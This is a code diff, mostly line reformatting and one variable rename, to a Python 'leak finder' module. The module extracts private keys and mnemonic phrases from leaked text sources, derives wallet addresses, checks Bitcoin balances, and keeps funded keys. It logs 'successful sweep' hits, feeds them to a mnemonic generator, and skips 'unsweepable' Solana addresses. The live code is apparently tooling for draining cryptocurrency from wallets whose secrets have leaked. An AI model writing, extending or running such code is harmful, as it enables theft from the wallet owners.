@@ -47,11 +47,8 @@ class LeakFinderResult:
 
     @property
     def elapsed_seconds(self) -> float:
-        return (
-            (self.completed_at - self.started_at).total_seconds()
-            if self.completed_at
-            else 0.0
-        )
+        return (self.completed_at - self.started_at).total_seconds() if self.completed_at else 0.0
+
 
 _LEAK_FINDER_SOURCES_DIR = pathlib.Path(__file__).parent / "sources"
 
@@ -63,16 +60,10 @@ def _discover_local_sources() -> dict[str, type]:
         module_name = py_file.stem
         key = module_name.replace("_source", "")
         try:
-            module = importlib.import_module(
-                f"src.modules.crypto.leak_finder.sources.{module_name}"
-            )
+            module = importlib.import_module(f"src.modules.crypto.leak_finder.sources.{module_name}")
             for attr_name in dir(module):
                 attr = getattr(module, attr_name)
-                if (
-                    isinstance(attr, type)
-                    and attr_name.endswith("Source")
-                    and hasattr(attr, "fetch_raw_leaks")
-                ):
+                if isinstance(attr, type) and attr_name.endswith("Source") and hasattr(attr, "fetch_raw_leaks"):
                     source_map[key] = attr
                     break
         except Exception:
@@ -165,16 +156,12 @@ class LeakFinderCoordinator:
 
                                 gen = SmartMnemonicGenerator()
                                 gen.add_hit_pattern(key.key_raw)
-                                logger.info(
-                                    "Recorded hit pattern from successful sweep"
-                                )
+                                logger.info("Recorded hit pattern from successful sweep")
                             except Exception:
                                 pass
                 elif sr.error and "Program-owned" in str(sr.error):
                     self._SKIP_SOL_ADDRESSES.add(sr.source_address)
-                    logger.debug(
-                        "Added %s to skip list (program-owned)", sr.source_address[:10]
-                    )
+                    logger.debug("Added %s to skip list (program-owned)", sr.source_address[:10])
         result.completed_at = datetime.now(timezone.utc)
         return result
 
@@ -193,18 +180,13 @@ class LeakFinderCoordinator:
                     for leak in res:
                         keys = extract_keys(leak.text)
                         for key in keys:
-                            kid = hashlib.sha256(
-                                key.key_raw.encode("utf-8")
-                            ).hexdigest()
+                            kid = hashlib.sha256(key.key_raw.encode("utf-8")).hexdigest()
                             if self._seen_keys_bf.contains(kid):
                                 continue
                             self._seen_keys_bf.add(kid)
                             if kid not in self._seen_keys:
                                 self._seen_keys.add(kid)
-                                if (
-                                    self._coordinator
-                                    and self._coordinator.is_mnemonic_seen(key.key_raw)
-                                ):
+                                if self._coordinator and self._coordinator.is_mnemonic_seen(key.key_raw):
                                     continue
                                 if self._coordinator:
                                     self._coordinator.mark_mnemonic_seen(
@@ -273,14 +255,10 @@ class LeakFinderCoordinator:
                     if kid not in self._seen_keys:
                         self._seen_keys.add(kid)
                         # Persistent SQLite dedup via coordinator
-                        if self._coordinator and self._coordinator.is_mnemonic_seen(
-                            key.key_raw
-                        ):
+                        if self._coordinator and self._coordinator.is_mnemonic_seen(key.key_raw):
                             continue
                         if self._coordinator:
-                            self._coordinator.mark_mnemonic_seen(
-                                key.key_raw, source=leak.source_url or "unknown"
-                            )
+                            self._coordinator.mark_mnemonic_seen(key.key_raw, source=leak.source_url or "unknown")
                         all_keys.append(key)
             except Exception:
                 pass
@@ -359,21 +337,17 @@ class LeakFinderCoordinator:
 
         for addr, key in btc_addrs:
             try:
-                r = await check_btc_balance(addr)
-                if r.balance >= self._MIN_BTC_SATS / 1e8:
+                btc_result = await check_btc_balance(addr)
+                if btc_result.balance >= self._MIN_BTC_SATS / 1e8:
                     funded.append(key)
-                elif r.balance > 0:
-                    logger.debug("Skipping dust BTC: %s (%.8f)", addr[:10], r.balance)
+                elif btc_result.balance > 0:
+                    logger.debug("Skipping dust BTC: %s (%.8f)", addr[:10], btc_result.balance)
             except Exception:
                 pass
 
         # Filter out known unsweepable addresses (program-owned nonce accounts etc)
         _SKIP_ADDRS = {"HAgk14JpMQLgt6rVgv7cBQFJWFto5Dqxi472uT3DKpqk"}
-        funded = [
-            k
-            for k in funded
-            if not any(a in _SKIP_ADDRS for a in k.derived_addresses.values())
-        ]
+        funded = [k for k in funded if not any(a in _SKIP_ADDRS for a in k.derived_addresses.values())]
 
         return funded
 
@@ -389,9 +363,7 @@ class LeakFinderCoordinator:
             # For mnemonics, derive private key hex on-the-fly
             if not key_hex and key.key_type == KeyType.MNEMONIC:
                 try:
-                    derived = derive_from_mnemonic(
-                        key.key_raw, chains=list(self._chains)
-                    )
+                    derived = derive_from_mnemonic(key.key_raw, chains=list(self._chains))
                     # Build chain_name -> (address, private_key_hex) map
                     key_map: dict[str, tuple[str, str]] = {}
                     for d in derived:
